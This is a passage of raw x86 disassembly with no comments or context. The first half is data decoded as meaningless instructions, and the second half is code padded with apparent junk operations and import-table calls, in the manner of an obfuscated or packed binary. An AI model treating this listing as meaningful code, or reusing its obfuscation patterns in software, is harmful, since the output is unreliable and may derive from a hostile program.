  41cb4b:	arpl   WORD PTR [ebx+0x3e],bp
  41cb4e:	sub    esi,DWORD PTR [ebx]
  41cb50:	jecxz  0x41cb12
  41cb52:	repnz repz or BYTE PTR [esi+0x10],dh
  41cb57:	pop    es
  41cb58:	dec    ebx
  41cb59:	outs   dx,DWORD PTR ds:[esi]
  41cb5a:	jmp    0x829d34ee
  41cb5f:	xchg   ebp,eax
  41cb60:	push   cs
  41cb61:	(bad)  
  41cb62:	sbb    al,0x7c
  41cb64:	cmp    al,0xac
  41cb66:	out    dx,al
  41cb67:	test   al,0x47
  41cb69:	popa   
  41cb6a:	adc    ecx,DWORD PTR [ebx+0x5f]
  41cb6d:	or     DWORD PTR [ebx+0x4a8799eb],eax
  41cb73:	test   BYTE PTR [esi+0x40],dl
  41cb76:	mov    eax,0x6dd01cda
  41cb7b:	test   eax,0xe95c8299
  41cb80:	pushf  
  41cb81:	lds    ecx,FWORD PTR [eax-0x1666a59b]
  41cb87:	push   cs
  41cb88:	push   es
  41cb89:	bound  ebp,QWORD PTR [ebx+0x4f152d04]
  41cb8f:	add    eax,0xc461abce
  41cb94:	dec    DWORD PTR [edi-0x486f64e4]
  41cb9a:	dec    esp
  41cb9b:	jne    0x41cb76
  41cb9d:	push   ebp
  41cb9e:	push   0x73
  41cba0:	sar    DWORD PTR [edx-0x2dfadfbe],cl
  41cba6:	loop   0x41cc00
  41cba8:	out    dx,al
  41cba9:	xlat   BYTE PTR ds:[ebx]
  41cbaa:	push   ecx
  41cbab:	mov    al,ds:0xc9b302be
  41cbb0:	ja     0x41cba0
  41cbb2:	ins    BYTE PTR es:[edi],dx
  41cbb3:	rcl    BYTE PTR [edi-0x1e02745d],cl
  41cbb9:	and    al,dl
  41cbbb:	xor    al,0xb
  41cbbd:	(bad)  
  41cbbe:	jmp    0x5c42:0x9c18f849
  41cbc5:	xchg   DWORD PTR [edi-0x60],ebx
  41cbc8:	sahf   
  41cbc9:	mov    gs,WORD PTR [eax]
  41cbcb:	fadd   DWORD PTR [ebx+0x7e]
  41cbce:	sbb    BYTE PTR [edx-0x1c04b751],bl
  41cbd4:	mov    esi,ecx
  41cbd6:	or     eax,edi
  41cbd8:	cmc    
  41cbd9:	ret    
  41cbda:	mov    ?,WORD PTR [esi-0x7b12e239]
  41cbe0:	mov    bl,0x8f
  41cbe2:	arpl   WORD PTR [edx],dx
  41cbe4:	sti    
  41cbe5:	aas    
  41cbe6:	xor    ah,bh
  41cbe8:	mov    eax,gs
  41cbea:	popa   
  41cbeb:	ja     0x41cbec
  41cbed:	dec    ecx
  41cbee:	lock mov ds:0x4b0816c5,al
  41cbf4:	jno    0x41cbd2
  41cbf6:	mov    edx,0x1011754f
  41cbfb:	or     eax,0x20e0b0f0
  41cc00:	fst    DWORD PTR [ecx]
  41cc02:	dec    edx
  41cc04:	repnz mov al,ds:0xe9e2ffa8
  41cc0a:	dec    ebx
  41cc0b:	popf   
  41cc0c:	das    
  41cc0d:	sbb    al,0x61
  41cc0f:	retf   
  41cc10:	jmp    0x41cc38
  41cc12:	aam    0xe5
  41cc14:	xchg   DWORD PTR [esi],ebx
  41cc16:	jb     0x41cc3c
  41cc18:	sar    dh,cl
  41cc1a:	fstp   QWORD PTR [esi+0x4b]
  41cc1d:	ror    bl,cl
  41cc1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc20:	push   edi
  41cc21:	(bad)  
  41cc22:	cmp    BYTE PTR [edi-0x3a],al
  41cc25:	mov    ah,0x22
  41cc27:	addr16 enter 0xf8fc,0x9d
  41cc2c:	pop    ss
  41cc2d:	inc    esp
  41cc2e:	shl    ebx,0x22
  41cc31:	leave  
  41cc32:	aad    0x61
  41cc34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc35:	push   ecx
  41cc36:	lods   eax,DWORD PTR ds:[esi]
  41cc37:	pop    ecx
  41cc39:	retf   
  41cc3a:	lock pop ebx
  41cc3c:	pop    ss
  41cc3d:	sbb    ecx,DWORD PTR [ebx+ebp*2-0xd483a4c]
  41cc44:	push   cs
  41cc45:	in     eax,dx
  41cc46:	mov    al,0x7d
  41cc48:	cmp    al,0x84
  41cc4a:	cdq    
  41cc4b:	scas   al,BYTE PTR es:[edi]
  41cc4c:	fiadd  WORD PTR [esi+0x12]
  41cc4f:	je     0x41cc02
  41cc51:	jge    0x41cc4d
  41cc53:	dec    esp
  41cc54:	pop    ebp
  41cc55:	add    ch,dl
  41cc57:	ret    
  41cc58:	inc    esp
  41cc59:	inc    esp
  41cc5a:	scas   eax,DWORD PTR es:[edi]
  41cc5b:	arpl   WORD PTR [edi],ax
  41cc5d:	lea    eax,[ebp-0xc]
  41cc60:	pop    esp
  41cc61:	mov    eax,0x9bbea2bf
  41cc66:	mov    al,ds:0x45ff04dd
  41cc6b:	xlat   BYTE PTR ds:[ebx]
  41cc6c:	sub    al,0xea
  41cc6e:	dec    eax
  41cc6f:	and    DWORD PTR [ebx-0x6d],eax
  41cc72:	lods   al,BYTE PTR ds:[esi]
  41cc73:	sub    eax,esi
  41cc75:	fidiv  DWORD PTR [edx+edx*2]
  41cc78:	mov    edx,0xbb554062
  41cc7d:	outs   dx,DWORD PTR ds:[esi]
  41cc7e:	xor    esi,DWORD PTR [ecx-0x1]
  41cc81:	hlt    
  41cc82:	imul   ebp,DWORD PTR [ebp+0x709d712d],0xcf0d2a97
  41cc8c:	in     eax,0xbc
  41cc8e:	push   es
  41cc8f:	imul   edx,DWORD PTR [ebx],0x3b
  41cc92:	adc    eax,0xc042fd03
  41cc97:	or     DWORD PTR [eax-0x6e],ebx
  41cc9a:	aad    0xf5
  41cc9c:	clc    
  41cc9d:	daa    
  41cc9e:	pushf  
  41cc9f:	dec    esi
  41cca0:	mov    ecx,0xaed46b9d
  41cca5:	jns    0x41cd1d
  41cca7:	popf   
  41cca8:	add    BYTE PTR [ebx+0x3a],bh
  41ccab:	mov    esi,0xf5ea2dad
  41ccb0:	lods   eax,DWORD PTR ds:[esi]
  41ccb1:	xchg   DWORD PTR [eax],eax
  41ccb3:	adc    DWORD PTR [eax],esp
  41ccb5:	scas   al,BYTE PTR es:[edi]
  41ccb6:	dec    esp
  41ccb7:	lods   eax,DWORD PTR ds:[esi]
  41ccb8:	fwait
  41ccb9:	ins    DWORD PTR es:[edi],dx
  41ccba:	aas    
  41ccbb:	mov    bl,0x97
  41ccbd:	ret    0xd3ea
  41ccc0:	loop   0x41cca8
  41ccc2:	inc    edx
  41ccc3:	sti    
  41ccc4:	lods   eax,DWORD PTR ds:[esi]
  41ccc5:	jnp    0x41cc5b
  41ccc7:	or     al,0xf2
  41ccc9:	mov    ds:0x85b5e57,al
  41ccce:	aad    0x47
  41ccd0:	or     al,0x12
  41ccd2:	dec    eax
  41ccd3:	dec    edx
  41ccd4:	or     edx,DWORD PTR [ebx]
  41ccd6:	idiv   dl
  41ccd8:	sub    DWORD PTR ds:0xe981e20f,edx
  41ccde:	mov    esp,0x4f72fac2
  41cce3:	mov    al,BYTE PTR [ebp-0x4b7f7604]
  41cce9:	mov    ch,0x9e
  41cceb:	pop    edx
  41ccec:	lods   al,BYTE PTR ds:[esi]
  41cced:	ficomp DWORD PTR [eax-0x3c]
  41ccf0:	mov    esp,0xdc0b636a
  41ccf5:	mov    ch,0xb3
  41ccf7:	rol    BYTE PTR [edi-0x37],cl
  41ccfa:	cmc    
  41ccfb:	sub    dl,BYTE PTR [eax+0x414e6c69]
  41cd01:	jne    0x41cd5a
  41cd03:	std    
  41cd04:	push   0x34
  41cd06:	stc    
  41cd07:	adc    eax,0x765ea57b
  41cd0c:	cld    
  41cd0d:	das    
  41cd0e:	data16 or bh,BYTE PTR [eax+0x69]
  41cd12:	aaa    
  41cd13:	add    bh,dl
  41cd15:	fwait
  41cd16:	outs   dx,BYTE PTR ds:[esi]
  41cd17:	xchg   esi,eax
  41cd18:	(bad)  
  41cd19:	pop    es
  41cd1a:	mov    al,0xa
  41cd1c:	fucom  st(0)
  41cd1e:	rcl    eax,1
  41cd20:	(bad)  
  41cd21:	cmc    
  41cd22:	or     al,0xe5
  41cd24:	(bad)  
  41cd25:	jg     0x41cd1c
  41cd27:	stc    
  41cd28:	ins    BYTE PTR es:[edi],dx
  41cd29:	fwait
  41cd2a:	push   es
  41cd2b:	sbb    cl,0x91
  41cd2e:	ja     0x41cd6c
  41cd30:	ins    DWORD PTR es:[edi],dx
  41cd31:	xlat   BYTE PTR ds:[ebx]
  41cd32:	jmp    0x41cd85
  41cd34:	outs   dx,BYTE PTR ds:[esi]
  41cd35:	loop   0x41cd95
  41cd37:	mov    esp,0x5126c83a
  41cd3c:	in     al,0x6d
  41cd3e:	neg    DWORD PTR [esi-0x6c]
  41cd41:	sbb    BYTE PTR [eax+0x65009556],bl
  41cd47:	fldcw  WORD PTR [edi+0x18e71853]
  41cd4d:	stc    
  41cd4e:	sbb    BYTE PTR [esi-0x68955fe8],0xfb
  41cd55:	js     0x41cd66
  41cd57:	add    al,0xef
  41cd59:	mov    bl,ch
  41cd5b:	jnp    0x41cd86
  41cd5d:	icebp  
  41cd5e:	je     0x41cd68
  41cd60:	repz and al,ch
  41cd63:	bound  esi,QWORD PTR [edi]
  41cd65:	xchg   ecx,eax
  41cd66:	rol    DWORD PTR [edi-0x40096ca9],cl
  41cd6c:	cmp    al,0x74
  41cd6e:	popa   
  41cd6f:	sub    al,0x4f
  41cd71:	xor    DWORD PTR [edx+0x256e975],edx
  41cd77:	(bad)  
  41cd78:	jp     0x41cdac
  41cd7a:	push   ds
  41cd7b:	int3   
  41cd7c:	scas   al,BYTE PTR es:[edi]
  41cd7d:	or     eax,0x40ff5a79
  41cd82:	pushf  
  41cd83:	pushf  
  41cd84:	mov    ebp,0x6e44d77b
  41cd89:	adc    dh,BYTE PTR [edx]
  41cd8b:	test   al,0xa1
  41cd8d:	pop    es
  41cd8e:	test   BYTE PTR gs:[ecx],0x91
  41cd92:	mov    al,ds:0x121cba2
  41cd97:	or     eax,0x434b12c5
  41cd9c:	jns    0x41cd5d
  41cd9e:	inc    ebp
  41cd9f:	xchg   edi,eax
  41cda0:	push   ss
  41cda1:	pop    edx
  41cda2:	add    al,0xac
  41cda4:	jecxz  0x41cd4f
  41cda6:	and    ah,dl
  41cda8:	mov    eax,ds:0x55d4cfc9
  41cdad:	adc    BYTE PTR [ecx+0x49],dl
  41cdb0:	(bad)  
  41cdb1:	shl    BYTE PTR [ebx+0xf5f46c8],0xda
  41cdb8:	push   0x34
  41cdba:	popa   
  41cdbb:	mov    ch,0x93
  41cdbd:	push   cs
  41cdbe:	in     al,dx
  41cdbf:	sub    DWORD PTR ds:0x1f8427d0,0x24b81adf
  41cdc9:	shl    ah,0xfb
  41cdcc:	xchg   esi,eax
  41cdcd:	clc    
  41cdce:	call   0xf44cc245
  41cdd3:	jne    0x41ce30
  41cdd5:	popa   
  41cdd6:	cmp    DWORD PTR [eax-0x44],0x1f
  41cdda:	or     eax,0x22c682a4
  41cddf:	repz shl BYTE PTR [esi+ebp*4],0xac
  41cde4:	adc    esp,DWORD PTR [eax+0x3f]
  41cde7:	stos   BYTE PTR es:[edi],al
  41cde8:	mov    esi,0x97332b8d
  41cded:	jb     0x41ce1e
  41cdef:	adc    esi,DWORD PTR [ecx]
  41cdf1:	pop    eax
  41cdf3:	call   DWORD PTR [ecx]
  41cdf5:	mov    ds:0x1a9d3d50,al
  41cdfa:	sub    eax,0xbd9657cd
  41cdff:	outs   dx,BYTE PTR ds:[esi]
  41ce00:	cli    
  41ce01:	fsub   QWORD PTR [ebx-0x340ef2e7]
  41ce07:	dec    ebp
  41ce08:	xchg   ebx,eax
  41ce09:	and    al,BYTE PTR [edx+0x20]
  41ce0c:	cli    
  41ce0d:	inc    ebx
  41ce0e:	inc    ecx
  41ce0f:	sbb    eax,0x4829b3e1
  41ce14:	sub    al,0x4a
  41ce16:	test   DWORD PTR [esi-0x5b],esp
  41ce19:	mov    al,ds:0x2f24cc32
  41ce1e:	call   0x4356:0xdabcbd01
  41ce25:	or     DWORD PTR [ecx+0x45c0feed],0x7c2d73
  41ce2f:	xor    al,0x88
  41ce31:	int3   
  41ce32:	and    ebx,DWORD PTR [edx+0x4a]
  41ce35:	xor    ebx,DWORD PTR [edi-0x438b5197]
  41ce3b:	call   0xe6e0:0x574f53f4
  41ce42:	mov    esp,0x87c8871d
  41ce47:	fcom   QWORD PTR [ecx]
  41ce49:	inc    BYTE PTR [esi+0x5a11b8a2]
  41ce4f:	xchg   esi,eax
  41ce50:	in     al,0x5
  41ce52:	(bad)  
  41ce53:	std    
  41ce54:	repnz add DWORD PTR [ecx+0x2eaf7127],edi
  41ce5b:	mov    eax,0xa812f6ec
  41ce60:	and    cl,0x62
  41ce63:	lock sbb DWORD PTR [ebx],esi
  41ce66:	and    BYTE PTR [edi+eax*1+0x5c],al
  41ce6a:	iret   
  41ce6b:	jmp    0xc350f484
  41ce70:	leave  
  41ce71:	in     al,dx
  41ce72:	shl    ebx,cl
  41ce74:	fisubr DWORD PTR [esi-0xf10d565]
  41ce7a:	nop
  41ce7b:	cld    
  41ce7c:	ret    
  41ce7d:	push   ecx
  41ce7e:	mov    cs,WORD PTR [edi-0x7987ef29]
  41ce84:	jno    0x41ceb1
  41ce86:	or     ebp,ebp
  41ce88:	pop    esi
  41ce89:	push   0xffffffd8
  41ce8b:	inc    ecx
  41ce8c:	sar    BYTE PTR [ecx-0x29c9e737],cl
  41ce92:	(bad)  
  41ce93:	xlat   BYTE PTR ds:[ebx]
  41ce94:	jbe    0x41cec4
  41ce96:	(bad)  
  41ce98:	sbb    DWORD PTR [ecx],eax
  41ce9a:	les    ecx,FWORD PTR [esp+edi*8+0x4]
  41ce9e:	ds push ebp
  41cea0:	pop    edx
  41cea1:	mov    ds:0x387d04e9,al
  41cea6:	test   BYTE PTR [ebp+0x94bd2c1],dh
  41ceac:	jmp    0x3fac:0xec25986f
  41ceb3:	aas    
  41ceb4:	push   ds
  41ceb5:	ret    
  41ceb6:	jmp    0xadf0:0x5488efe7
  41cebd:	push   esp
  41cebe:	xchg   ecx,edx
  41cec0:	inc    eax
  41cec1:	fcomip st,st(1)
  41cec3:	dec    esp
  41cec4:	mov    ch,0x4a
  41cec6:	jne    0xe7a9c04a
  41cecc:	add    ch,ah
  41cece:	xor    al,0xfb
  41ced0:	jmp    0xe3e1:0x11ebd201
  41ced7:	or     BYTE PTR [edi+0x5c],0x97
  41cedb:	mov    dl,0x23
  41cedd:	mov    ah,0x23
  41cedf:	fmul   DWORD PTR [ecx]
  41cee1:	fild   DWORD PTR [edx+0x24]
  41cee4:	cs leave 
  41cee6:	mov    ebx,0x685743f9
  41ceeb:	sbb    edx,DWORD PTR fs:[ebx]
  41ceee:	xchg   edx,eax
  41ceef:	xchg   edx,eax
  41cef0:	add    dh,BYTE PTR [ebx]
  41cef2:	cmp    eax,0xd885c70d
  41cef7:	(bad)  
  41cef8:	(bad)  
  41cef9:	push   DWORD PTR [edi]
  41cefb:	jne    0x41cefd
  41cefd:	add    BYTE PTR [ecx],dh
  41ceff:	adc    eax,0x428499
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x428509,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428471,0x428575
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428571,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x4284f5,0x42835d
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428391,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428585,0x0
  41cf60:	mov    DWORD PTR ds:0x428521,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x4284a1
  41cf70:	mov    ecx,DWORD PTR ds:0x42849d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x428519
  41cf86:	mov    DWORD PTR ds:0x42836d,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428585,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42857d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x42835d
  41cfbb:	sbb    DWORD PTR ds:0x42859d,ecx
  41cfc1:	sub    DWORD PTR ds:0x42845d,ecx
  41cfc7:	not    DWORD PTR ds:0x428519
  41cfcd:	xor    DWORD PTR ds:0x428515,edi
  41cfd3:	mov    DWORD PTR ds:0x428455,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428571
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428591,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x428469,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x42835d,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428595
  41d021:	mov    DWORD PTR ds:0x428461,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42848d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42857d,edx
  41d040:	cmp    DWORD PTR ds:0x42835d,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428391
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x4284f9
  41d060:	mov    esi,DWORD PTR ds:0x428531
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x428509,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428375,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428581
  41d07d:	sbb    DWORD PTR ds:0x428485,esi
  41d083:	sbb    DWORD PTR ds:0x428589,0x428439
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42838d,0x0
  41d096:	mov    DWORD PTR ds:0x428511,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x428521,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42857d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42838d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x42856d,edx
  41d0df:	xor    DWORD PTR ds:0x428379,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x428351,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x428469,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428375,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428581
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x428359
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x42850d,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428375,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x428569
  41d15b:	add    esi,DWORD PTR ds:0x42848d
  41d161:	mov    DWORD PTR ds:0x428569,esi
  41d167:	mov    esi,DWORD PTR ds:0x428431
  41d16d:	and    esi,DWORD PTR ds:0x428459
  41d173:	mov    DWORD PTR ds:0x428431,esi
  41d179:	sbb    DWORD PTR ds:0x4284a1,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x42846d
  41d189:	add    DWORD PTR ds:0x4284f5,esi
  41d18f:	movzx  esi,WORD PTR ds:0x428469
  41d196:	adc    esi,DWORD PTR ds:0x428385
  41d19c:	mov    DWORD PTR ds:0x428469,esi
  41d1a2:	xor    DWORD PTR ds:0x428359,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42837d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x428365,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42847d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428571,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428499,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x428351
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42859d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42847d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428495
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x428425
  41d240:	adc    DWORD PTR ds:0x4284f5,esi
  41d246:	sub    DWORD PTR ds:0x428509,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428581,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x428459,0x0
  41d265:	mov    DWORD PTR ds:0x42837d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x4284ed
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x42856d,ebx
  41d285:	movzx  eax,WORD PTR ds:0x42843d
  41d28c:	cmp    DWORD PTR ds:0x428459,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x428263
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x428569
  41d2be:	xor    DWORD PTR ds:0x428505,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428491,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42857d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428591
  41d2dc:	add    DWORD PTR ds:0x42836d,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x428539
  41d2ec:	mov    edx,DWORD PTR ds:0x4285d1
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x42845d,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x4284f9,0x0
  41d329:	mov    DWORD PTR ds:0x428521,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428371
  41d33a:	mov    ecx,DWORD PTR ds:0x428451
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x42842d,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428389,edi
  41d355:	cmp    DWORD PTR ds:0x4284f9,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x4283b5
  41d377:	mov    edx,DWORD PTR ds:0x4285d9
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x4284d5
  41d38e:	mov    edx,DWORD PTR ds:0x4285cd
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x428511,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42859d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x4283f9
  41d3b2:	mov    edx,DWORD PTR ds:0x4284ad
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x4283c5
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x4283d1
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x428429
  41d412:	xor    DWORD PTR ds:0x4284f5,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42859d,0x428359
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428589,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x428449,0x0
  41d45e:	mov    DWORD PTR ds:0x42856d,0x177e
  41d468:	mov    DWORD PTR ds:0x4284e9,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x4284f9
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428391,edx
  41d488:	cmp    DWORD PTR ds:0x428449,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428591
  41d49a:	push   0x428185
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x428565,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x4283a9
  41d4c0:	mov    esi,DWORD PTR ds:0x428405
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428591,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428595,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42838d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42859d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428395,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428581,0x0
  41d53c:	mov    DWORD PTR ds:0x428485,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428485,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428395,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428581,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
